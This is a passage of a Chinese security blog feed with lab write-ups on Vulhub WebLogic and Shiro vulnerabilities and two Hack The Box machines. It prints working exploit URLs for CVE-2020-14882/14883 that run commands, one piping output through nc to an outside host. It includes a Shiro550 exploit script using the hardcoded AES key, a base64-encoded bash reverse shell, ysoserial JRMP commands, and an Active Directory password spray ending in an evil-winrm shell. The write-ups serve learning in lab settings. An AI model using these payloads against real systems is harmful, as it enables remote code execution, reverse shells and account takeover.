title="读取后台用户密文与密钥文件"></a>读取后台用户密文与密钥文件</h3><blockquote><p>weblogic密码使用AES（老版本3DES）加密，对称加密可解密，只需要找到用户的密文与加密时的密钥即可。这两个文件均位于base_domain下，名为<code>SerializedSystemIni.dat</code>和<code>config.xml</code>，在本环境中为<code>./security/SerializedSystemIni.dat</code>和<code>./config/config.xml</code>（基于当前目录<code>/root/Oracle/Middleware/user_projects/domains/base_domain</code>）。</p><p><code>SerializedSystemIni.dat</code>是一个二进制文件，所以一定要用burpsuite来读取，用浏览器直接下载可能引入一些干扰字符。在burp里选中读取到的那一串乱码，右键copy to file就可以保存成一个文件：</p></blockquote><p>看起来网站的根目录在<code>/root/Oracle/Middleware/user_projects/domains/base_domain</code></p><blockquote><p>config.xml是base_domain的全局配置文件，所以乱七八糟的内容比较多，找到其中的<node-manager-password-encrypted>的值，即为加密后的管理员密码，</p></blockquote><pre><code>&lt;node-manager-password-encrypted&gt;&#123;AES&#125;yvGnizbUS0lga6iPA5LkrQdImFiS/DJ8Lw/yeE7Dt0k=&lt;/node-manager-password-encrypted&gt;</code></pre><p><img src="/img/image-20241112104939975.png" alt="image-20241112104939975"></p><p>（这里需要低版本的java才能运行，但是GPT一下好像没有特别中意的java虚拟环境工具，后面再看看吧）</p><p>最后解密出密码正确。</p><h2 id="Weblogic-管理控制台未授权远程命令执行漏洞（CVE-2020-14882，CVE-2020-14883、CVE-2019-2725）"><a href="#Weblogic-管理控制台未授权远程命令执行漏洞（CVE-2020-14882，CVE-2020-14883、CVE-2019-2725）" class="headerlink" title="Weblogic 管理控制台未授权远程命令执行漏洞（CVE-2020-14882，CVE-2020-14883、CVE-2019-2725）"></a>Weblogic 管理控制台未授权远程命令执行漏洞（CVE-2020-14882，CVE-2020-14883、CVE-2019-2725）</h2><p>权限绕过漏洞（CVE-2020-14882），访问以下URL，即可未授权访问到管理后台页面：</p><pre><code>http://127.0.0.1:7001/console/css/%252e%252e%252fconsole.portal</code></pre><p><code>%252e%252e%e%252f</code> 是<code>../</code>的url双重编码</p><blockquote><p>访问后台后，可以发现我们现在是低权限的用户，无法安装应用，所以也无法直接执行任意代码</p></blockquote><blockquote><p>此时需要利用到第二个漏洞CVE-2020-14883。这个漏洞的利用方式有两种，一是通过<code>com.tangosol.coherence.mvel2.sh.ShellSession</code>，二是通过<code>com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext</code>。</p></blockquote><p>直接访问如下URL，即可利用<code>com.tangosol.coherence.mvel2.sh.ShellSession</code>执行命令：</p><pre><code>http://127.0.0.1:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&amp;_pageLabel=&amp;handle=com.tangosol.coherence.mvel2.sh.ShellSession(&quot;java.lang.Runtime.getRuntime().exec(&#39;echo+hello+%7C+nc+-q+1+172.20.10.4+9001&#39;);&quot;)</code></pre><p>发现没有nc，<code>touch+%2Ftmp%2Fpwn</code></p><p>执行成功</p><p>看一下另一个链子（CVE-2019-2725）<code>com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext</code>：</p><p>需要构造一个XML文件</p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;   xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;   xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt;    &lt;bean id=&quot;pb&quot; class=&quot;java.lang.ProcessBuilder&quot; init-method=&quot;start&quot;&gt;        &lt;constructor-arg&gt;          &lt;list&gt;            &lt;value&gt;bash&lt;/value&gt;            &lt;value&gt;-c&lt;/value&gt;            &lt;value&gt;&lt;![CDATA[touch /tmp/success2]]&gt;&lt;/value&gt;          &lt;/list&gt;        &lt;/constructor-arg&gt;    &lt;/bean&gt;&lt;/beans&gt;</code></pre><p>然后通过如下URL，即可让Weblogic加载这个XML，并执行其中的命令：</p><pre><code>http://your-ip:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&amp;_pageLabel=&amp;handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(&quot;http://example.com/rce.xml&quot;)</code></pre><p>&#x3D;&#x3D;&gt;</p><pre><code>http://127.0.0.1:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&amp;_pageLabel=&amp;handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(&quot;http://172.20.10.4:8000/exp.xml&quot;)</code></pre><p>界面虽然返回404，但是在docker中可以看到命令执行成功了</p><p><span style="color:gray;">weblogic剩下几个cve比较老了，先跳过。</span></p><p><span style="color:gray;">待续…</span></p><h1 id="Shiro"><a href="#Shiro" class="headerlink" title="Shiro"></a>Shiro</h1><h2 id="Apache-Shiro-认证绕过漏洞（CVE-2020-1957）"><a href="#Apache-Shiro-认证绕过漏洞（CVE-2020-1957）" class="headerlink" title="Apache Shiro 认证绕过漏洞（CVE-2020-1957）"></a>Apache Shiro 认证绕过漏洞（CVE-2020-1957）</h2><p>在Apache Shiro 1.5.2以前的版本中，在使用Spring动态控制器时，攻击者通过构造<code>..;</code>这样的跳转，可以绕过Shiro中对目录的权限限制。</p><h2 id="poc-2"><a href="#poc-2" class="headerlink" title="poc"></a>poc</h2><p>直接请求管理页面<code>/admin/</code>，无法访问，将会被重定向到登录页面,构造恶意请求<code>/xxx/..;/admin/</code>，即可绕过权限校验，访问到管理页面。</p><p><a href="https://xz.aliyun.com/t/8281?time__1311=n4+xnD0Dc7eE5DsAYxCq7K40ImRfj6haoD">CVE-2020-1957 Apache Shiro Servlet未授权访问浅析 - 先知社区</a></p><p>需要注意<code>/xxx/</code>可以换成其他无法被解析到的路径，如果使用<code>login.html</code>这样的可能会被shiro转到其他解析方式导致复现失败。</p><h2 id="CVE-2010-3863"><a href="#CVE-2010-3863" class="headerlink" title="CVE-2010-3863"></a>CVE-2010-3863</h2><p>在Apache Shiro 1.1.0以前的版本中，shiro 进行权限验证前未对url 做标准化处理，攻击者可以构造<code>/</code>、<code>//</code>、<code>/./</code>、<code>/../</code> 等绕过权限验证</p><p>构造恶意请求<code>/./admin</code>，即可绕过权限校验，访问到管理页面</p><h2 id="shiro550-CVE-2016-4437"><a href="#shiro550-CVE-2016-4437" class="headerlink" title="shiro550(CVE-2016-4437)"></a>shiro550(CVE-2016-4437)</h2><p><a href="https://blog.csdn.net/Bossfrank/article/details/130173880">shiro550反序列化漏洞原理与漏洞复现（基于vulhub，保姆级的详细教程）_shiro550原理-CSDN博客</a></p><blockquote><p>这里出现问题的点就在于AES加解密的过程中使用的密钥key。AES是一种对称密钥密码体制，加解密用到是相同的密钥，这个密钥应该是绝对保密的，但在shiro版本&lt;&#x3D;1.2.24的版本中使用了固定的密钥kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;，这样攻击者直接就可以用这个密钥实现上述加密过程，在Cookie字段写入想要服务端执行的恶意代码，最后服务端在对cookie进行解密的时候（反序列化后）就会执行恶意代码。在后续的版本中，这个密钥也可能会被爆破出来，从而被攻击者利用构造payload。</p></blockquote><blockquote><p>其漏洞的核心成因是cookie中的身份信息进行了AES加解密，用于加解密的密钥应该是绝对保密的，但在shiro版本&lt;&#x3D;1.2.24的版本中使用了固定的密钥。因此，验证漏洞的核心应该还是在于我们（攻击者）可否获得这个AES加密的密钥，如果确实是固定的密钥kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;或者其他我们可以通过脚本工具爆破出来的密钥，那么shiro550漏洞才一定存在。</p></blockquote><p>靶场搭建后直接用工具包中的shiro利用工具直接rce了，再看看博主的trail：</p><p><a href="https://github.com/insightglacier/Shiro_exploit">insightglacier&#x2F;Shiro_exploit: Apache Shiro 反序列化漏洞检测与利用工具</a></p><p>使用工具探测，（jdk1.8 python2.7）</p><pre><code></code></pre><blockquote><p>如果运行该脚本时报错No module named ‘Crypto’，则运行如下命令：</p><pre><code class="bash">pip uninstall crypto pycryptodomepip install pycryptodome</code></pre></blockquote><p>但是搞不出来，说是2.7不提供pip支持了，不知道是我环境的问题还是啥，先这样，跳过探测。</p><p>先制作一个反弹shell的payload：<a href="https://ares-x.com/tools/runtime-exec">Runtime.exec Payload Generater | AresX’s Blog</a></p><pre><code>bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMjAuMTAuNC8yMTEgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</code></pre><p>利用序列化工具<code>ysoserial.jar</code>生成payload:</p><pre><code>java -cp ysoserial.jar ysoserial.exploit.JRMPListener 7777 CommonsCollections5 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMjAuMTAuNC8yMTEgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</code></pre><blockquote><p> 对这段命令做个简要的解释：这里我们相当于在攻击机上启动了一个VPS服务，监听7777端口，然后在这个服务上放了一个反弹shell的payload，并用序列化工具ysoserial指定 CommonsCollections5 利用链生成可执行bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.200.131&#x2F;6666 0&gt;&amp;1命令的序列化数据payload1。当后面有客户端请求服务时，我们搭建的这个JRMP就会返回这段payload1。</p><p>至于为什么是CommonsCollections5 ，这是因为靶场的 shiro 存在 commons-collections 3.2.1 依赖， 是一个版本问题，这里就不细究源代码了。</p></blockquote><p>让存在漏洞的页面去请求我们攻击机的VPS服务</p><p>生成<a href="https://so.csdn.net/so/search?q=AES%E5%8A%A0%E5%AF%86&spm=1001.2101.3001.7020">AES加密</a>&#x3D;&gt;Base64编码后的rememberMe字段:<code>python2</code></p><pre><code class="python2">import sysimport uuidimport base64import subprocessfrom Crypto.Cipher import AESdef encode_rememberme(command):    popen = subprocess.Popen([&#39;java&#39;, &#39;-jar&#39;, &#39;ysoserial.jar&#39;, &#39;JRMPClient&#39;, command], stdout=subprocess.PIPE)    BS = AES.block_size    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()    key = base64.b64decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;)    iv = uuid.uuid4().bytes    encryptor = AES.new(key, AES.MODE_CBC, iv)    file_body = pad(popen.stdout.read())    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))    return base64_ciphertext if __name__ == &#39;__main__&#39;:    payload = encode_rememberme(sys.argv[1])   print &quot;rememberMe=&#123;0&#125;&quot;.format(payload.decode())</code></pre><blockquote><p>代码中key &#x3D; base64.b64decode(“kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;”)这一行括号内即为AES加密的密钥，如果密钥是其他的，在这里就填写其他的密钥。脚本运行的命令如下（读者应当更改为攻击机ip:JRMP监听的端口号），注意shiro.py的位置应当保证和ysoserial.jar在同一目录下</p></blockquote><pre><code>python2 shiro.py &#123;vps:port&#125;</code></pre><p>这里又要使用pycryptodome包，把脚本改一下用python3运行，（幸好不长，只有个别地方调整一下就行）</p><pre><code>rememberMe=4PtwVRwjQ5O1yaDZDv9ORjOCkcGcMpNY/Uh1CRNJqhPF/wWliNnicOdQ6aIewAxwdmIiMS76Io5MjRgIsj0XcENTG0Kaibo/tnj489lfLifaFrVtDxxLxrsUwkHhj3vUECZ17AyAblEofyK8jI4Lmg9qwSiyxapcxtOoLaGMKa6244+LOMzCnB+TSKkACjoqxCELpQyvyasQxPoNPNKoiRIiYXwk2t+ZFVbLL4zPocQYlxgugAUFgCYTeMP33xgyEicKgHdFmF5fNMV3cY1ODNi0ApVJ2XTbG4muwLHLawxAUEz691T/llGaMfy8gFFwamHCZ21EaNqcO1Kq6mhQNKLELyMIYt9j0OxPJW2veHDdm4oXp5ouMuNnHvENt4dvCMz6aJEbYVCbx3g5qMAjoA==</code></pre><p>整：</p><p><img src="/img/image-20241115163314746.png" alt="image-20241115163314746"></p><p>这里需要注意是在cookie后添加这段代码，而不是修改post body里的<code>remember me</code>字段</p><p> 看到返回的包里有<code>deleteMe</code>基本上就成功了</p><p>博主贴心地给了个总结：</p><blockquote><p>攻击过程复盘<br> 对于攻击者而言，核心就是干了两件事：</p><p>1.搭建VPS进行JRMPListener，存放反弹shell的payload1</p><p>2.将上述VPS进行JRMPListener的地址进行了AES加密和base64编码，构造请求包cookie中的rememberMe字段，向存在漏洞的服务器发送加密编码后的结果payload2。</p><p>那么对于靶机服务器，他是怎么沦陷的呢？</p><p>1.接收到请求包payload2，对他进行base64解码&#x3D;&gt;AES解密，发现要和一个VPS的JRMP 7777端口进行通信。</p><p>2.向恶意站点VPS的JRMP 7777进行请求，接收到了到了序列化后的恶意代码（反弹shell到攻击机的6666端口）payload1。</p><p>3.对payload1执行了反序列化，执行了反弹shell的恶意命令，就此沦陷。</p><p>原文链接：<a href="https://blog.csdn.net/Bossfrank/article/details/130173880">https://blog.csdn.net/Bossfrank/article/details/130173880</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;楔子&quot;&gt;&lt;a href=&quot;#楔子&quot; class=&quot;headerlink&quot; title=&quot;楔子&quot;&gt;&lt;/a&gt;楔子&lt;/h1&gt;&lt;p&gt;由于最近也不知道该学什么，怎么学，最关键是要不要学，很迷茫。&lt;/p&gt;
&lt;p&gt;之前培训以及前两天跟同事交流都提到了vulhub这个玩意儿，以前</summary>
      
    
    
    
    
    <category term="Middleware" scheme="https://taninluv.github.io/tags/Middleware/"/>
    
    <category term="Vulhub" scheme="https://taninluv.github.io/tags/Vulhub/"/>
    
  </entry>
  
  <entry>
    <title>HTB_CICADA</title>
    <link href="https://taninluv.github.io/2024/10/28/HTB-CICADA/"/>
    <id>https://taninluv.github.io/2024/10/28/HTB-CICADA/</id>
    <published>2024-10-28T12:03:57.000Z</published>
    <updated>2024-11-04T10:55:33.369Z</updated>
    
    <content type="html"><![CDATA[<h1 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h1><pre><code>└─# nmap 10.10.11.35                 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-28 08:07 EDTNmap scan report for 10.10.11.35Host is up (0.43s latency).Not shown: 991 filtered tcp ports (no-response)PORT     STATE SERVICE53/tcp   open  domain135/tcp  open  msrpc139/tcp  open  netbios-ssn389/tcp  open  ldap445/tcp  open  microsoft-ds464/tcp  open  kpasswd5593/tcp  open  http-rpc-epmap636/tcp  open  ldapssl3269/tcp open  globalcatLDAPssl</code></pre><p>发现有139和445，可能是windows,而且有ldap看起来是有域环境在的。</p><p>使用</p><pre><code>nmap -A -O 10.10.11.35</code></pre><p>重新扫一下可以确认，就是htb有时候网络拥堵，会比较慢</p><p>smb匿名登录一下：</p><pre><code>smbclient -L ////$ip -U &quot;&quot;# smbclient -L -N ////$ip </code></pre><pre><code>Password for [WORKGROUP\]:        Sharename       Type      Comment        ---------       ----      -------        ADMIN$          Disk      Remote Admin        C$              Disk      Default share        DEV             Disk              HR              Disk              IPC$            IPC       Remote IPC        NETLOGON        Disk      Logon server share         SYSVOL          Disk      Logon server share Reconnecting with SMB1 for workgroup listing.do_connect: Connection to 10.10.11.35 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)Unable to connect with SMB1 -- no workgroup available</code></pre><blockquote><p>GPT：</p><p>在匿名登录 SMB 服务时，通常可以访问一些默认的共享目录，这些目录可能包括：</p><ol><li><strong>IPC$</strong>: 这是一个用于进程间通信的共享，通常对所有用户开放。</li><li><strong>ADMIN$</strong>: 管理共享，通常只对管理员可见，但某些配置可能允许匿名访问。</li><li><strong>C$</strong>: 系统根目录的共享，通常也只对管理员可见，但可能在某些配置下对匿名用户开放。</li><li><strong>NETLOGON</strong>: 存储登录脚本和策略的共享，通常只对域控制器可用。</li><li><strong>SYSVOL</strong>: 存储域控制器的公共文件夹，通常用于存放组策略和登录脚本。</li></ol></blockquote><p>这个<code>DEV</code>和<code>HR</code>应该是后面创建的，可以看看，发现还是上面的回显，有些忘了怎么测试smb了，看看wp：</p><blockquote><p>Checking SMB first using <code>enum4linux</code></p><pre><code>enum4linux $ip</code></pre></blockquote><p>运行后看到一个：</p><pre><code>[+] Server 10.10.11.35 allows sessions using username &#39;&#39;, password &#39;&#39;    </code></pre><blockquote><p>Using <code>impacket</code> tools and in specific <code>crackmapexec</code> to identify available shares</p><pre><code>poetry run  crackmapexec  smb $ip -u &quot;&quot; -p &quot;&quot; --shares</code></pre></blockquote><p>这里poetry属于是pip+venv，我kali报错先不使用这个虚拟环境。</p><pre><code>└─# crackmapexec  smb 10.10.11.35 -u &quot;&quot; -p &quot;&quot; --sharesSMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\: SMB         10.10.11.35     445    CICADA-DC        [-] Error enumerating shares: STATUS_ACCESS_DENIED</code></pre><p>这个DC应该是域控，把地址加到hosts先</p><pre><code>echo &quot;10.10.11.35 cicada.htb CICADA-DC.cicada.htb&quot; &gt;&gt; /etc/hosts</code></pre><p>查看HR（前面是命令错了）：</p><pre><code>smbclient  //10.10.11.35/HR Password for [WORKGROUP\root]:Try &quot;help&quot; to get a list of possible commands.smb: \&gt; ls  .                                   D        0  Thu Mar 14 08:29:09 2024  ..                                  D        0  Thu Mar 14 08:21:29 2024  Notice from HR.txt                  A     1266  Wed Aug 28 13:31:48 2024</code></pre><p>为什么变成两个<code>/</code>有点忘了，之前的博客好像写过，先记着吧。</p><p>使用megt下载这个文件</p><pre><code>cat Notice\ from\ HR.txt Dear new hire!Welcome to Cicada Corp! We&#39;re thrilled to have you join our team. As part of our security protocols, it&#39;s essential that you change your default password to something unique and secure.Your default password is: Cicada$M6Corpb*@Lp#nZp!8To change your password:1. Log in to your Cicada Corp account** using the provided username and the default password mentioned above.2. Once logged in, navigate to your account settings or profile settings section.3. Look for the option to change your password. This will be labeled as &quot;Change Password&quot;.4. Follow the prompts to create a new password**. Make sure your new password is strong, containing a mix of uppercase letters, lowercase letters, numbers, and special characters.5. After changing your password, make sure to save your changes.Remember, your password is a crucial aspect of keeping your account secure. Please do not share your password with anyone, and ensure you use a complex password.If you encounter any issues or need assistance with changing your password, don&#39;t hesitate to reach out to our support team at support@cicada.htb.Thank you for your attention to this matter, and once again, welcome to the Cicada Corp team!Best regards,Cicada Corp</code></pre><p>看到了邮件里的默认密码：Cicada$M6Corpb*@Lp#nZp!8</p><p>爆破一下用户名：</p><pre><code>crackmapexec  smb $ip -u &quot;guest&quot; -p &quot;&quot; --rid-brute</code></pre><pre><code>crackmapexec  smb 10.10.11.35 -u &quot;guest&quot; -p &quot;&quot; --rid-brute &gt; username.txt</code></pre><p>密码喷洒：(先处理username.txt)</p><pre><code>grep -oP &#39;(?&lt;=CICADA\\)[^ ]+&#39; filenamecrackmapexec  smb $ip -u username.txt -p &#39;Cicada$M6Corpb*@Lp#nZp!8&#39;</code></pre><blockquote><p>gtp:</p><p>为了确保能匹配到 <code>emily.oscars</code>，不受后续字符（如括号）影响，你可以使用更灵活的正则表达式。例如，可以使用 <code>.*?</code> 来匹配任意字符，直到遇到括号：</p><pre><code>bash复制代码grep -oP &#39;(?&lt;=CICADA\\)[^ ]+&#39; filename</code></pre><p>这里的正则表达式解释如下：</p><ul><li><code>(?&lt;=CICADA\\)</code>: 匹配前面是 <code>CICADA\</code> 的位置。</li><li><code>[^ ]+</code>: 匹配一个或多个非空格字符，这样就可以一直匹配到 <code>emily.oscars</code>，直到遇到空格为止。</li></ul><p>这样就可以成功提取到 <code>emily.oscars</code>，无论后面是否有括号或其他内容。</p></blockquote><p>然后可以得到一个账户：</p><p><code>michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8</code></p><p>测试一下这个账户的权限：</p><pre><code>crackmapexec  smb $ip -u &quot;michael.wrightson&quot; -p &#39;Cicada$M6Corpb*@Lp#nZp!8&#39; --shares</code></pre><pre><code>crackmapexec  smb 10.10.11.35 -u &quot;michael.wrightson&quot; -p &#39;Cicada$M6Corpb*@Lp#nZp!8&#39; --shares</code></pre><p>显示timeout，htb的网真的想杀人：</p><pre><code>└─# crackmapexec  smb 10.10.11.35 -u &quot;michael.wrightson&quot; -p &#39;Cicada$M6Corpb*@Lp#nZp!8&#39; --sharesSMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 SMB         10.10.11.35     445    CICADA-DC        [-] Error enumerating shares: The NETBIOS connection with the remote host timed out.</code></pre><p>直接连上去吧：</p><pre><code>smbclient //$ip -U &#39;michael.wrightson&#39;</code></pre><p>但是！</p><blockquote><p>└─# smbclient &#x2F;&#x2F;10.10.11.35 -U ‘michael.wrightson’ Password for [WORKGROUP\michael.wrightson]: \10.10.11.35: Not enough ‘&#39; characters in service</p></blockquote><blockquote><p>GPT:</p><p>这个错误通常是由于指定的 SMB 服务路径不正确导致的。在使用 <code>smbclient</code> 时，路径格式应该是 <code>//&lt;主机名&gt;/&lt;共享名&gt;</code>。</p><p>在你的命令中，应该添加共享名。尝试以下命令：</p><pre><code>bash复制代码smbclient //10.10.11.35/&lt;共享名&gt; -U &#39;michael.wrightson&#39;</code></pre></blockquote><p>但话又说回来~</p><blockquote><p>GPT:</p><p>请将 <code>&lt;共享名&gt;</code> 替换为实际的共享目录名（如 <code>IPC$</code> 或其他共享名称）。如果不确定共享名，可以使用以下命令列出可用共享：</p><pre><code>bash复制代码smbclient -L //10.10.11.35 -U &#39;michael.wrightson&#39;</code></pre></blockquote><p>没有GPT包一天都学不下去的(T^T)</p><pre><code>└─# smbclient -L //10.10.11.35 -U &#39;michael.wrightson&#39;Password for [WORKGROUP\michael.wrightson]:        Sharename       Type      Comment        ---------       ----      -------        ADMIN$          Disk      Remote Admin        C$              Disk      Default share        DEV             Disk              HR              Disk              IPC$            IPC       Remote IPC        NETLOGON        Disk      Logon server share         SYSVOL          Disk      Logon server share Reconnecting with SMB1 for workgroup listing.do_connect: Connection to 10.10.11.35 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)Unable to connect with SMB1 -- no workgroup available</code></pre><p>有新文件了，瞅一瞅：</p><pre><code>mbclient //10.10.11.35/SYSVOL -U &#39;michael.wrightson&#39;Password for [WORKGROUP\michael.wrightson]:Try &quot;help&quot; to get a list of possible commands.smb: \&gt; ls  .                                   D        0  Thu Aug 22 13:40:07 2024  ..                                  D        0  Thu Mar 14 07:08:56 2024  cicada.htb                         Dr        0  Thu Mar 14 07:08:56 2024                4168447 blocks of size 4096. 414427 blocks availablesmb: \&gt; mget cicada.htb/*</code></pre><p>上去了，找不到有用的东西，没什么经验先学习wp怎么做吧：</p><p>使用名为<code>ldapdomaindump</code>的LDAP工具，转储了可以使用实际当前用户权限查询的所有内容</p><pre><code>ldapdomaindump 10.10.11.35 -u &#39;cicada.htb\michael.wrightson&#39; -p &#39;Cicada$M6Corpb*@Lp#nZp!8&#39;</code></pre><p>下载了很多domain开头的文件，像是一些日志啥的，先梭哈一下：</p><pre><code>grep password domain* </code></pre><pre><code class="shell">domain_users.html:&lt;tr&gt;&lt;td&gt;David Orelious&lt;/td&gt;&lt;td&gt;David Orelious&lt;/td&gt;&lt;td&gt;david.orelious&lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;td&gt;&lt;a href=&quot;domain_users_by_group.html#cn_Domain_Users&quot; title=&quot;CN=Domain Users,OU=Group,DC=cicada,DC=htb&quot;&gt;Domain Users&lt;/a&gt;&lt;/td&gt;&lt;td&gt;03/14/24 12:17:29&lt;/td&gt;&lt;td&gt;10/29/24 10:30:00&lt;/td&gt;&lt;td&gt;10/29/24 13:02:29&lt;/td&gt;&lt;td&gt;NORMAL_ACCOUNT, DONT_EXPIRE_PASSWD&lt;/td&gt;&lt;td&gt;03/14/24 12:17:29&lt;/td&gt;&lt;td&gt;&lt;abbr title=&quot;S-1-5-21-917908876-1423158569-3159038727-1108&quot;&gt;1108&lt;/abbr&gt;&lt;/td&gt;&lt;td&gt;Just in case I forget my password is aRt$Lp#7t*VQ!3&lt;/td&gt;&lt;/tr&gt;</code></pre><p>舒服了，<code>david.orelious:aRt$Lp#7t*VQ!3</code></p><pre><code>└─# crackmapexec  smb 10.10.11.35 -u &#39;david.orelious&#39; -p &#39;aRt$Lp#7t*VQ!3&#39; --sharesSMB         10.10.11.35     445    NONE             [*]  x64 (name:) (domain:) (signing:True) (SMBv1:False)SMB         10.10.11.35     445    NONE             [-] Connection Error: The NETBIOS connection with the remote host timed out.</code></pre><p>习惯就行，手工测试，在DEV找到新凭证<code>emily.oscars:Q!3@Lp#M6b*7t*Vt</code></p><p>这个账户可以访问文件系统，于是：</p><pre><code>evil-winrm -i $ip -u &quot;emily.oscars&quot; -p &#39;Q!3@Lp#M6b*7t*Vt&#39;</code></pre><p>可以得到一个shell</p><pre><code>evil-winrm -i 10.10.11.35 -u &quot;emily.oscars&quot; -p &#39;Q!3@Lp#M6b*7t*Vt&#39;                                        Evil-WinRM shell v3.5                                        Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                                                                                                                                 Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                        Info: Establishing connection to remote endpoint*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents&gt; </code></pre><p>后续需要下载内网脚本，有点累了内网先就到这里先准备ctf考核，等后续需要研究内网和域渗透的时候再研究这个靶机。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;nmap&quot;&gt;&lt;a href=&quot;#nmap&quot; class=&quot;headerlink&quot; title=&quot;nmap&quot;&gt;&lt;/a&gt;nmap&lt;/h1&gt;&lt;pre&gt;&lt;code&gt;└─# nmap 10.10.11.35                 
Starting Nmap 7.</summary>
      
    
    
    
    
    <category term="Windows" scheme="https://taninluv.github.io/tags/Windows/"/>
    
    <category term="SMB" scheme="https://taninluv.github.io/tags/SMB/"/>
    
    <category term="域" scheme="https://taninluv.github.io/tags/%E5%9F%9F/"/>
    
  </entry>
  
  <entry>
    <title>HTB_Sightless</title>
    <link href="https://taninluv.github.io/2024/10/28/HTB-Sightless/"/>
    <id>https://taninluv.github.io/2024/10/28/HTB-Sightless/</id>
    <published>2024-10-28T06:13:16.000Z</published>
    <updated>2024-10-28T11:46:38.553Z</updated>
    
    <content type="html"><![CDATA[<h1 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h1><pre><code>nmap 10.10.11.32 -sCV -p 21,22,80Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-28 02:10 EDTStats: 0:00:26 elapsed; 0 hosts completed (1 up), 1 undergoing Service ScanService scan Timing: About 66.67% done; ETC: 02:11 (0:00:13 remaining)Nmap scan report for sightless.htb (10.10.11.32)Host is up (0.30s latency).PORT   STATE SERVICE VERSION21/tcp open  ftp| fingerprint-strings: |   GenericLines: |     220 ProFTPD Server (sightless.htb FTP Server) [::ffff:10.10.11.32]|     Invalid command: try being more creative|_    Invalid command: try being more creative22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   256 c9:6e:3b:8f:c6:03:29:05:e5:a0:ca:00:90:c9:5c:52 (ECDSA)|_  256 9b:de:3a:27:77:3b:1b:e1:19:5f:16:11:be:70:e0:56 (ED25519)                                                               80/tcp open  http    nginx 1.18.0 (Ubuntu)                                                                                      |_http-title: Sightless.htb|_http-server-header: nginx/1.18.0 (Ubuntu)1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port21-TCP:V=7.94SVN%I=7%D=10/28%Time=671F2AFC%P=x86_64-pc-linux-gnu%r(SF:GenericLines,A0,&quot;220\x20ProFTPD\x20Server\x20\(sightless\.htb\x20FTP\x2SF:0Server\)\x20\[::ffff:10\.10\.11\.32\]\r\n500\x20Invalid\x20command:\x2SF:0try\x20being\x20more\x20creative\r\n500\x20Invalid\x20command:\x20try\SF:x20being\x20more\x20creative\r\n&quot;);Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 77.90 seconds</code></pre><p>开启了ftp，尝试匿名登录看一眼：</p><pre><code>└─# ftp 10.10.11.32                   Connected to 10.10.11.32.220 ProFTPD Server (sightless.htb FTP Server) [::ffff:10.10.11.32]Name (10.10.11.32:root): anonymous550 SSL/TLS required on the control channelftp: Login failedftp&gt; exit221 Goodbye.</code></pre><p>登录不了，看一下网页：</p><blockquote><p>SQLPad</p><p>SQLPad is a web app that lets users connect to various SQL servers via a browser. Click “Start Now” to try a demo!</p></blockquote><p>我勒个sql，进去看一下，到处点点点，在<code>access</code>下可以看到有一个user：</p><blockquote><p><a href="mailto:&#106;&#x6f;&#104;&#x6e;&#64;&#115;&#x69;&#x67;&#104;&#x74;&#108;&#101;&#x73;&#115;&#x2e;&#116;&#104;&#x62;">&#106;&#x6f;&#104;&#x6e;&#64;&#115;&#x69;&#x67;&#104;&#x74;&#108;&#101;&#x73;&#115;&#x2e;&#116;&#104;&#x62;</a></p></blockquote><p>搜索sqlpad的漏洞，只有一个rce：</p><blockquote><p><a href="https://github.com/0xRoqeeb/sqlpad-rce-exploit-CVE-2022-0944/blob/main/exploit.py">sqlpad-rce-exploit-CVE-2022-0944&#x2F;exploit.py at main 